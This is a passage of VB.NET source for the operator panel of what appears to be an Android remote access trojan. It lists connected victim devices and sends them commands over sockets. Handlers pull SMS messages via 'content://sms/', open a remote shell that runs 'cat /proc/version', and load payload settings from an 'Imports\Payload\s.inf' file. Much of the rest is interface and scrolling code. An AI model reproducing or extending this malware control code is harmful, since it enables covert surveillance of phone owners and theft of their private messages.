    Private Sub PowhellToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PowhellToolStripMenuItem.Click
        Dim str As String = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        Dim processStartInfo As System.Diagnostics.ProcessStartInfo = New System.Diagnostics.ProcessStartInfo() With
        {
            .FileName = str,
            .WindowStyle = ProcessWindowStyle.Normal
        }
        Process.Start(processStartInfo)
    End Sub

    Private Sub PView_CellEnter(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles PView.CellEnter
        Me.NView.ClearSelection()
        Me.GView.ClearSelection()
    End Sub

    Private Sub QwdqasdxToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ReceiveConnectionToolStripMenuItem.Click
        Try
            Dim str As String = "Receive_connection"
            Dim item As Testconnection = DirectCast(My.Application.OpenForms(str), Testconnection)
            If (item IsNot Nothing) Then
                Return
            Else
                item = New Testconnection() With
                {
                    .Name = str,
                    .Text = str
                }
                Dim tEXTPORT As TextBox = item.TEXTPORT
                Dim port As Integer = DirectCast(Me.Socket.Listener.LocalEndpoint, IPEndPoint).Port
                tEXTPORT.Text = port.ToString()
                Dim str1 As String = String.Concat(Store.Resources(1), "\Imports\Payload\s.inf")
                If (File.Exists(str1)) Then
                    Dim strArrays As String() = File.ReadAllLines(str1)
                    If (CInt(strArrays.Length) >= 10) Then
                        item.TEXTIP.Text = strArrays(5)
                    End If
                End If
                item.Show()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ReconnectToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ReconnectToolStripMenuItem.Click
        Try
            For Each obj As Object In Me.DataGridView1.SelectedRows
                Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
                Dim socketClient As SocketClient = CType(dataGridViewRow.Tag, SocketClient)
                Dim flag As Boolean = socketClient IsNot Nothing
                If flag Then
                    socketClient.Close(False)
                End If
            Next
        Finally
        End Try
    End Sub

    Private Sub RefreshBlackListView()
        Me.DataBlackListView.Rows.Clear()
        Dim count As Integer = Me.BlackList.Count - 1
        Dim num As Integer = 0
        Do
            Me.DataBlackListView.Rows.Add(New Object() {num.ToString(), GetFlagThisIp.GetFlagThisIp(Me.BlackList(num).ToString()), Me.BlackList(num).ToString()})
            num = num + 1
        Loop While num <= count
        If (Me.BlackList.Count <= 0) Then
            Me.LNothing1.Visible = True
        Else
            Me.LNothing1.Visible = False
        End If
    End Sub

    Private Sub RefresTextIP()
        Dim str As String = Me.TTextAddress.Text.Trim()
        If (Not (Me.BlackList.Contains(str) Or Operators.CompareString(str, Nothing, False) = 0 Or Not Store.CheckIPAddress(str))) Then
            Me.TTextAddress._CBorderLave0_S = Color.FromArgb(72, 72, 74)
            Me.TTextAddress._CBorderLave1_S = Color.FromArgb(72, 72, 74)
            Me.TTextAddress.__CLRXX_S = Color.FromArgb(100, 100, 100)
        Else
            Me.TTextAddress._CBorderLave0_S = Color.FromArgb(72, 72, 74)
            Me.TTextAddress._CBorderLave1_S = Color.FromArgb(72, 72, 74)
            Me.TTextAddress.__CLRXX_S = Color.FromArgb(222, 80, 80)
        End If
        Me.TTextAddress.Refresh()
    End Sub

    Private Sub ScrollPanel()
        If (Me.bPNL1 And Me.bPNL2 And Me.bPNL3 And Not Me.DownPNL.Enabled) Then
            Dim size As System.Drawing.Size = Me.PanelMain.Size
            Dim height As Integer = size.Height - Me.SplitContainer1.Panel2.Height
            If (height < 0) Then
                height = 0
            End If
            Me.VisualStudioVerticalScrollBar2.Maximum = height
        End If
    End Sub

    Private Sub SdfsdfToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SdfsdfToolStripMenuItem.Click
        Dim text As String = "edit_host"
        Dim rehost As REhost = CType(My.Application.OpenForms(text), REhost)
        Dim flag As Boolean = rehost Is Nothing
        If flag Then
            rehost = New REhost()
            rehost.Name = text
            rehost.Text = text
            rehost.Show()
            Try
                For i As Integer = 0 To Me.DataGridView1.Rows.Count - 1
                    Dim dataGridViewRow As DataGridViewRow = Me.DataGridView1.Rows(i)
                    Dim socketClient As SocketClient = CType(dataGridViewRow.Tag, SocketClient)
                    Dim flag2 As Boolean = socketClient IsNot Nothing
                    If flag2 Then
                        rehost.DataGridView1.Rows.Add(New Object() {socketClient.Wallpaper, socketClient.ClientName, socketClient.Flag.Tag, socketClient.Flag, socketClient.ClientRemoteAddress})
                        Dim index As Integer = i
                        rehost.DataGridView1.Rows(index).Tag = socketClient
                    End If
                Next
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub SettingsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SettingsToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(String.Concat(Store.BFF(Store.buff, CLng(48)), Data.SplitData))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub ShellTerminalToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ShellTerminalToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(37)), Data.SplitData, "cat /proc/version", Data.SplitData, "Nothing"}))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub SMSManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SMSManagerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(27)), Data.SplitData, "content://sms/", Data.SplitData, "True"}))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub SplitContainer1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles SplitContainer1.MouseDown
        If (e.Button <> System.Windows.Forms.MouseButtons.Right) Then
            If (e.Button = System.Windows.Forms.MouseButtons.Left) Then
                Me.MySplitX = New Form() With
                {
                    .ShowInTaskbar = False,
                    .ShowIcon = False,
                    .Text = Nothing,
                    .BackColor = Color.FromArgb(100, 100, 103),
                    .FormBorderStyle = System.Windows.Forms.FormBorderStyle.None,
                    .TopMost = True,
                    .Opacity = 0
                }
                Me.MySplitX.Show()
                Dim width As Integer = MyBase.Width
                Dim clientSize As System.Drawing.Size = MyBase.ClientSize
                Dim num As Integer = CInt(Math.Round(CDbl((width - clientSize.Width)) / 2))
                Dim height As Integer = MyBase.Height
                clientSize = MyBase.ClientSize
                Dim height1 As Integer = height - clientSize.Height - 1 * num
                Dim mySplitX As Form = Me.MySplitX
                Dim x As Integer = System.Windows.Forms.Cursor.Position.X
                Dim location As Point = MyBase.Location
                mySplitX.Location = New Point(x, location.Y + Me.PanelTop.Height + height1)
                Dim size As Form = Me.MySplitX
                Dim splitterWidth As Integer = Me.SplitContainer1.SplitterWidth
                clientSize = Me.SplitContainer1.Panel2.Size
                size.Size = New System.Drawing.Size(splitterWidth, clientSize.Height)
                Me.MySplitX.Opacity = 0.5
                Me.MySplitX.TopMost = False
            End If
        End If
    End Sub

    Private Sub SplitContainer1_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles SplitContainer1.MouseMove
        If (Me.MySplitX IsNot Nothing) Then
            Dim mySplitX As Form = Me.MySplitX
            Dim splitterWidth As Integer = Me.SplitContainer1.SplitterWidth
            Dim size As System.Drawing.Size = Me.SplitContainer1.Panel2.Size
            mySplitX.Size = New System.Drawing.Size(splitterWidth, size.Height)
            Dim client As System.Drawing.Point = MyBase.PointToClient(System.Windows.Forms.Cursor.Position)
            If (client.X >= MyBase.Size.Width - 45) Then
                Me.MySplitX.BackColor = Color.FromArgb(252, 75, 75)
            ElseIf (client.X <= 25) Then
                Me.MySplitX.BackColor = Color.FromArgb(252, 75, 75)
            Else
                Me.SplitaX = client.X
                Dim width As Integer = MyBase.Width
                size = MyBase.ClientSize
                Dim num As Integer = CInt(Math.Round(CDbl((width - size.Width)) / 2))
                Dim height As Integer = MyBase.Height
                size = MyBase.ClientSize
                Dim height1 As Integer = height - size.Height - 1 * num
                Dim point As Form = Me.MySplitX
                Dim x As Integer = System.Windows.Forms.Cursor.Position.X
                Dim location As System.Drawing.Point = MyBase.Location
                point.Location = New System.Drawing.Point(x, location.Y + Me.PanelTop.Height + height1)
                Me.MySplitX.BackColor = Color.FromArgb(100, 100, 103)
            End If
        End If
    End Sub

    Private Sub SplitContainer1_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles SplitContainer1.MouseUp
        Try
            If (Me.MySplitX IsNot Nothing) Then
                Me.SplitContainer1.SplitterDistance = Me.SplitaX
                Me.MySplitX.Close()
                Me.SplitContainer1.Invalidate()
                Me.Refresh()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub SplitContainer1_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles SplitContainer1.Paint
        ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, Me.clrSplit, 1, ButtonBorderStyle.Solid, Me.clrSplit, 0, ButtonBorderStyle.Solid, Me.clrSplit, 0, ButtonBorderStyle.Solid, Me.clrSplit, 0, ButtonBorderStyle.Solid)
    End Sub
    Private Sub SplitContainer2_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles SplitContainer2.MouseDown
        If (e.Button <> System.Windows.Forms.MouseButtons.Right) Then
            If (e.Button = System.Windows.Forms.MouseButtons.Left) Then
                Me.MySplity = New Form() With
                {
                    .ShowInTaskbar = False,
                    .ShowIcon = False,
                    .Text = Nothing,
                    .BackColor = Color.FromArgb(100, 100, 103),
                    .FormBorderStyle = System.Windows.Forms.FormBorderStyle.None,
                    .TopMost = True,
                    .Opacity = 0
                }
                Me.MySplity.Show()
                Dim width As Integer = MyBase.Width
                Dim clientSize As System.Drawing.Size = MyBase.ClientSize
                Dim num As Integer = CInt(Math.Round(CDbl((width - clientSize.Width)) / 2))
                Dim height As Integer = MyBase.Height
                clientSize = MyBase.ClientSize
                Dim height1 As Integer = height - clientSize.Height - 1 * num
                Dim mySplity As Form = Me.MySplity
                Dim location As Point = MyBase.Location
                Dim x As Integer = location.X + num
                location = System.Windows.Forms.Cursor.Position
                mySplity.Location = New Point(x, location.Y)
                Dim size As Form = Me.MySplity
                clientSize = Me.SplitContainer1.Panel1.Size
                size.Size = New System.Drawing.Size(clientSize.Width, Me.SplitContainer1.SplitterWidth)
                Me.MySplity.Opacity = 0.5
                Me.MySplity.TopMost = False
            End If
        End If
    End Sub

    Private Sub SplitContainer2_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles SplitContainer2.MouseMove
        If (Me.MySplity IsNot Nothing) Then
            Dim mySplity As Form = Me.MySplity
            Dim size As System.Drawing.Size = Me.SplitContainer1.Panel1.Size
            mySplity.Size = New System.Drawing.Size(size.Width, Me.SplitContainer2.SplitterWidth)
            Dim client As System.Drawing.Point = MyBase.PointToClient(System.Windows.Forms.Cursor.Position)
            If (client.Y >= MyBase.Size.Height - 110) Then
                Me.MySplity.BackColor = Color.FromArgb(252, 75, 75)
            ElseIf (client.Y <= 64) Then
                Me.MySplity.BackColor = Color.FromArgb(252, 75, 75)
            Else
                Me.Splitay = client.Y
                Dim width As Integer = MyBase.Width
                size = MyBase.ClientSize
                Dim num As Integer = CInt(Math.Round(CDbl((width - size.Width)) / 2))
                Dim height As Integer = MyBase.Height
                size = MyBase.ClientSize
                Dim height1 As Integer = height - size.Height - 1 * num
                Dim point As Form = Me.MySplity
                Dim location As System.Drawing.Point = MyBase.Location
                Dim x As Integer = location.X + num
                location = System.Windows.Forms.Cursor.Position
                point.Location = New System.Drawing.Point(x, location.Y)
                Me.MySplity.BackColor = Color.FromArgb(100, 100, 103)
            End If
        End If
    End Sub

    Private Sub SplitContainer2_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles SplitContainer2.MouseUp
        Try
            If (Me.MySplity IsNot Nothing) Then
                Me.SplitContainer2.SplitterDistance = Me.Splitay - 35
                Me.MySplity.Close()
                Me.SplitContainer2.Invalidate()
                Me.Refresh()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub SplitContainer2_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles SplitContainer2.Paint
        ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, Me.clrSplit, 0, ButtonBorderStyle.Solid, Me.clrSplit, 1, ButtonBorderStyle.Solid, Me.clrSplit, 0, ButtonBorderStyle.Solid, Me.clrSplit, 0, ButtonBorderStyle.Solid)
    End Sub

    Private Sub ThemeTabControl1_Click(ByVal sender As Object, ByVal e As TabControlEventArgs) Handles MTabControl.Selected
        Try
            If (e.TabPageIndex <> -1) Then
                If (Me.MTabControl.TabPages.Contains(e.TabPage)) Then
                    Me.LabelText.TxText = Me.MTabControl.TabPages(e.TabPageIndex).Text
                    If (Operators.CompareString(Me.MTabControl.TabPages(e.TabPageIndex).Name, "TabPageBlackList", False) <> 0) Then
                        If (Me.LNothing1.Visible) Then
                            Me.LNothing1.Visible = False
                        End If
                    End If
                End If
            End If
            Me.PNLTEXT.Invalidate()
        Catch ex As Exception

        End Try

    End Sub

    Private Sub ToBlackListToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ToBlackListToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    Dim str As String = tag.ClientAddressIP.Trim()
                    If (Not (Me.BlackList.Contains(str) Or Operators.CompareString(str, Nothing, False) = 0 Or Not Store.CheckIPAddress(str))) Then
                        Me.BlackList.Add(str)
                        Me.RefreshBlackListView()
                    End If
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub ToEndDataBdownBlackListView()
        Try
            If (Me.DataBlackListView.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataBlackListView.FirstDisplayedScrollingRowIndex = Me.DataBlackListView.RowCount - 1
                Me.DataBlackListView.CurrentCell = Me.DataBlackListView.Rows(Me.DataBlackListView.RowCount - 1).Cells(1)
                Me.DataBlackListView.Rows(Me.DataBlackListView.RowCount - 1).Selected = True
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ToEndDataLogsView()
        Try
            If (Me.DataLogsView.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataLogsView.FirstDisplayedScrollingRowIndex = Me.DataLogsView.RowCount - 1
                Me.DataLogsView.CurrentCell = Me.DataLogsView.Rows(Me.DataLogsView.RowCount - 1).Cells(1)
                Me.DataLogsView.Rows(Me.DataLogsView.RowCount - 1).Selected = True
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ToEndDataMonitorView()
        Try
            If (Me.DataMonitorAndroidView.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataMonitorAndroidView.FirstDisplayedScrollingRowIndex = Me.DataMonitorAndroidView.RowCount - 1
                Me.DataMonitorAndroidView.CurrentCell = Me.DataMonitorAndroidView.Rows(Me.DataMonitorAndroidView.RowCount - 1).Cells(1)
                Me.DataMonitorAndroidView.Rows(Me.DataMonitorAndroidView.RowCount - 1).Selected = True
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        Try
            If (Not Me.ContinueTrans) Then
                If (MyBase.Opacity <= 0.9) Then
                    MyBase.Opacity = MyBase.Opacity + 0.1
                End If
            ElseIf (MyBase.Opacity = 1) Then
                Me.Trans.Enabled = False
            Else
                MyBase.Opacity = MyBase.Opacity + 0.1
                Me.TScrolls.Interval = Store.TScrollsInterval
                Me.TScrolls.Enabled = True
            End If
        Catch exception As System.Exception
        End Try
    End Sub
    Private Sub TScrolls_Tick(sender As Object, e As EventArgs) Handles TScrolls.Tick
        Dim visible As Boolean = MyBase.Visible
        If visible Then
            Dim dataGridView As Object = Me.DataGridView1
            SyncLock dataGridView
                Dim flag2 As Boolean = Me.DataGridView1.Rows.Count > 0
                Dim num2 As Integer
                If flag2 Then
                    Dim num As Integer = Me.DataGridView1.Rows.Count * Me.DataGridView1.Rows(0).Height
                    Dim flag3 As Boolean = num > Me.DataGridView1.Height
                    If flag3 Then
                        num2 = CInt(Math.Round(CDbl(Me.DataGridView1.Height) / CDbl(Me.DataGridView1.Rows(0).Height))) - 2
                        Dim flag4 As Boolean = num2 < 0
                        If flag4 Then
                            num2 = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.DataGridView1.Rows.Count - num2
                Me.GridViewoVerticalScrollBar0()
            End SyncLock
            Dim dataLogsView As Object = Me.DataLogsView
            SyncLock dataLogsView
                Dim flag6 As Boolean = Me.DataLogsView.Rows.Count > 0
                Dim num4 As Integer
                If flag6 Then
                    Dim num3 As Integer = Me.DataLogsView.Rows.Count * Me.DataLogsView.Rows(0).Height
                    Dim flag7 As Boolean = num3 > Me.DataLogsView.Height
                    If flag7 Then
                        num4 = CInt(Math.Round(CDbl(Me.DataLogsView.Height) / CDbl(Me.DataLogsView.Rows(0).Height))) - 2
                        Dim flag8 As Boolean = num4 < 0
                        If flag8 Then
                            num4 = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar3.Maximum = Me.DataLogsView.Rows.Count - num4
                Me.GridViewoVerticalScrollBar1()
                Dim flag9 As Boolean = Operators.ConditionalCompareObjectEqual(Me.Bdown0.Tag, "down", False)
                If flag9 Then
                    Dim flag10 As Boolean = Me.int0 > 0
                    If flag10 Then
                        Me.int0 = 0
                        Me.ToEndDataLogsView()
                    End If
                End If
                Dim flag11 As Boolean = Operators.ConditionalCompareObjectEqual(Me.BAutoDelete0.Tag, "AutoDelete", False)
                If flag11 Then
                    Dim flag12 As Boolean = Me.DataLogsView.Rows.Count > 25
                    If flag12 Then
                        Dim flag13 As Boolean = Me.TScrolls.Interval = Store.TScrollsInterval
                        If flag13 Then
                            Me.TScrolls.Interval = 1
                        End If
                        Try
                            Me.DataLogsView.Rows.RemoveAt(0)
                        Catch ex As Exception
                        End Try
                    Else
                        Dim flag14 As Boolean = Me.TScrolls.Interval = 1
                        If flag14 Then
                            Me.TScrolls.Interval = Store.TScrollsInterval
                        End If
                    End If
                End If
            End SyncLock
            Dim dataBlackListView As Object = Me.DataBlackListView
            SyncLock dataBlackListView
                Dim flag16 As Boolean = Me.DataBlackListView.Rows.Count > 0
                Dim num6 As Integer
                If flag16 Then
                    Dim num5 As Integer = Me.DataBlackListView.Rows.Count * Me.DataBlackListView.Rows(0).Height
                    Dim flag17 As Boolean = num5 > Me.DataBlackListView.Height
                    If flag17 Then
                        num6 = CInt(Math.Round(CDbl(Me.DataBlackListView.Height) / CDbl(Me.DataBlackListView.Rows(0).Height))) - 2
                        Dim flag18 As Boolean = num6 < 0
                        If flag18 Then
                            num6 = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar4.Maximum = Me.DataBlackListView.Rows.Count - num6
                Me.GridViewoVerticalScrollBar2()
                Dim flag19 As Boolean = Operators.ConditionalCompareObjectEqual(Me.Bdown1.Tag, "down", False)
                If flag19 Then
                    Dim flag20 As Boolean = Me.int1 > 0
                    If flag20 Then
                        Me.int1 = 0
                        Me.ToEndDataBdownBlackListView()
                    End If
                End If
            End SyncLock
            Dim dataMonitorAndroidView As Object = Me.DataMonitorAndroidView
            SyncLock dataMonitorAndroidView
                Dim flag22 As Boolean = Me.DataMonitorAndroidView.Rows.Count > 0
                Dim num8 As Integer
                If flag22 Then
                    Dim num7 As Integer = Me.DataMonitorAndroidView.Rows.Count * Me.DataMonitorAndroidView.Rows(0).Height
                    Dim flag23 As Boolean = num7 > Me.DataMonitorAndroidView.Height
                    If flag23 Then
                        num8 = CInt(Math.Round(CDbl(Me.DataMonitorAndroidView.Height) / CDbl(Me.DataMonitorAndroidView.Rows(0).Height))) - 2
                        Dim flag24 As Boolean = num8 < 0
                        If flag24 Then
                            num8 = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar5.Maximum = Me.DataMonitorAndroidView.Rows.Count - num8
                Me.GridViewoVerticalScrollBar3()
                Dim flag25 As Boolean = Operators.ConditionalCompareObjectEqual(Me.Bdown2.Tag, "down", False)
                If flag25 Then
                    Dim flag26 As Boolean = Me.int2 > 0
                    If flag26 Then
                        Me.int2 = 0
                        Me.ToEndDataMonitorView()
                    End If
                End If
                Dim flag27 As Boolean = Operators.ConditionalCompareObjectEqual(Me.BAutoDelete1.Tag, "AutoDelete", False)
                If flag27 Then
                    Dim flag28 As Boolean = Me.DataMonitorAndroidView.Rows.Count > 25
                    If flag28 Then
                        Dim flag29 As Boolean = Me.TScrolls.Interval = Store.TScrollsInterval
                        If flag29 Then
                            Me.TScrolls.Interval = 1
                        End If
                        Try
                            Me.DataMonitorAndroidView.Rows.RemoveAt(0)
                        Catch ex2 As Exception
                        End Try
                    Else
                        Dim flag30 As Boolean = Me.TScrolls.Interval = 1
                        If flag30 Then
                            Me.TScrolls.Interval = Store.TScrollsInterval
                        End If
                    End If
                End If
            End SyncLock
            Me.ScrollPanel()
            Me.BOXDOWN.Invalidate()
            Dim flag31 As Boolean = Me.DataGridView1.Rows.Count > 0
            If flag31 Then
                Dim flag32 As Boolean = Me.remov >= Me.DataGridView1.Rows.Count
                If flag32 Then
                    Me.remov = 0
                End If
                Try
                    Dim flag33 As Boolean = Operators.ConditionalCompareObjectEqual(Me.DataGridView1.Rows(Me.remov).Cells(0).Tag, "-", False)
                    If flag33 Then
                        Me.DataGridView1.Rows.RemoveAt(Me.remov)
                    End If
                Catch ex3 As Exception
                End Try
                Me.remov += 1
            End If
        End If
    End Sub
    Private Sub TTextAddress_Enter(ByVal sender As Object, ByVal e As EventArgs) Handles TTextAddress.Enter
        Me.RefresTextIP()
    End Sub

    Private Sub TTextAddress_TextChanged(ByVal sender As Object, ByVal e As EventArgs) Handles TTextAddress.TextChanged
        Me.RefresTextIP()
    End Sub

    Public Sub Update_Label()
        Dim item As System.Windows.Forms.DataGridViewCell = Me.PView.Rows(0).Cells(2)
        Dim count As Integer = Me.DataGridView1.Rows.Count
        item.Value = count.ToString()
        Dim str As System.Windows.Forms.DataGridViewCell = Me.PView.Rows(1).Cells(2)
        count = Me.Socket.ClientsOnline.Count
        str.Value = count.ToString()
        Dim dataGridViewCell As System.Windows.Forms.DataGridViewCell = Me.PView.Rows(2).Cells(2)
        count = Me.Socket.RequestData.Count
        dataGridViewCell.Value = count.ToString()
        Me.NView.Rows(0).Cells(2).Value = Store.GetHostName()
        Me.NView.Rows(1).Cells(2).Value = Store.GetIPAddress()
        Dim arrays As Array = Store.Bandwidth()
        Me.NView.Rows(2).Cells(2).Value = CStr(arrays.GetValue(0))
        Me.NView.Rows(3).Cells(2).Value = CStr(arrays.GetValue(1))
        Me.NView.Rows(4).Cells(2).Value = CStr(arrays.GetValue(2))
        Me.NView.Rows(5).Cells(2).Value = CStr(arrays.GetValue(3))
        If (Operators.CompareString(CStr(arrays.GetValue(4)), "False", False) = 0) Then
            If (Me.NView.Rows(6).Cells(2).Style.ForeColor <> Color.FromArgb(78, 201, 176)) Then
                Me.NView.Rows(6).Cells(2).Style.ForeColor = Color.FromArgb(78, 201, 176)
                Me.NView.Rows(6).Cells(2).Style.SelectionForeColor = Color.FromArgb(78, 201, 176)
            End If
        ElseIf (Me.NView.Rows(6).Cells(2).Style.ForeColor <> Color.FromArgb(255, 128, 128)) Then
            Me.NView.Rows(6).Cells(2).Style.ForeColor = Color.FromArgb(255, 128, 128)
            Me.NView.Rows(6).Cells(2).Style.SelectionForeColor = Color.FromArgb(255, 128, 128)
        End If
        If (Operators.CompareString(CStr(arrays.GetValue(5)), "False", False) = 0) Then
            If (Me.NView.Rows(7).Cells(2).Style.ForeColor <> Color.FromArgb(255, 128, 128)) Then
                Me.NView.Rows(7).Cells(2).Style.ForeColor = Color.FromArgb(255, 128, 128)
                Me.NView.Rows(7).Cells(2).Style.SelectionForeColor = Color.FromArgb(255, 128, 128)
            End If
        ElseIf (Me.NView.Rows(7).Cells(2).Style.ForeColor <> Color.FromArgb(78, 201, 176)) Then
            Me.NView.Rows(7).Cells(2).Style.ForeColor = Color.FromArgb(78, 201, 176)
            Me.NView.Rows(7).Cells(2).Style.SelectionForeColor = Color.FromArgb(78, 201, 176)
        End If
        If (Operators.CompareString(CStr(arrays.GetValue(4)), "False", False) <> 0) Then
            Me.NView.Rows(6).Cells(2).Value = "Received only"
        Else
            Me.NView.Rows(6).Cells(2).Value = "Send & Receive"
        End If
        Me.NView.Rows(7).Cells(2).Value = CStr(arrays.GetValue(5))
        Me.NView.Rows(8).Cells(2).Value = CStr(arrays.GetValue(6))
        Me.NView.Rows(9).Cells(2).Value = CStr(arrays.GetValue(7))
        Me.GView.Rows(0).Cells(2).Value = Store.GetStartTime()
        Me.GView.Rows(1).Cells(2).Value = Store.ThreadsCount()
        Dim arrays1 As Array = Store.UploadDownload(Data.BytesSent, Data.BytesReceived)
        Me.PView.Rows(3).Cells(2).Value = CStr(arrays1.GetValue(0))
        Me.PView.Rows(4).Cells(2).Value = CStr(arrays1.GetValue(1))
    End Sub

    Private Sub UpdateLabels_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles UpdateLabels.Tick
        Me.Update_Label()
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.DataGridView1.HorizontalScrollingOffset <> -1) Then
                Me.DataGridView1.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioHorizontalScrollBar2_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar2.Scroll
        Try
            If (Me.DataLogsView.HorizontalScrollingOffset <> -1) Then
                Me.DataLogsView.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar2.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioHorizontalScrollBar3_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar3.Scroll
        Try
            If (Me.DataBlackListView.HorizontalScrollingOffset <> -1) Then
                Me.DataBlackListView.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar3.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioHorizontalScrollBar4_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar4.Scroll
        Try
            If (Me.DataMonitorAndroidView.HorizontalScrollingOffset <> -1) Then
                Me.DataMonitorAndroidView.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar4.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.DataGridView1.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            If (Me.DataGridView1.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
            End If
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar2_Scroll(ByVal sender As Object) Handles VisualStudioVerticalScrollBar2.Scroll
        Try
            If (Me.bPNL1 And Me.bPNL2 And Me.bPNL3 And Not Me.DownPNL.Enabled) Then
                Me.PanelMain.Top = 0 - Me.VisualStudioVerticalScrollBar2.Value + Me.Panel2.Height
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar3_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar3.Scroll
        Try
            If (Me.DataLogsView.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.DataLogsView.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar3.Value
            End If
        Catch exception As System.Exception
            If (Me.DataLogsView.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataLogsView.FirstDisplayedScrollingRowIndex = Me.DataLogsView.RowCount - 1
            End If
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar4_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar4.Scroll
        Try
            If (Me.DataBlackListView.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.DataBlackListView.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar4.Value
            End If
        Catch exception As System.Exception
            If (Me.DataBlackListView.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataBlackListView.FirstDisplayedScrollingRowIndex = Me.DataBlackListView.RowCount - 1
            End If
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar5_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar5.Scroll
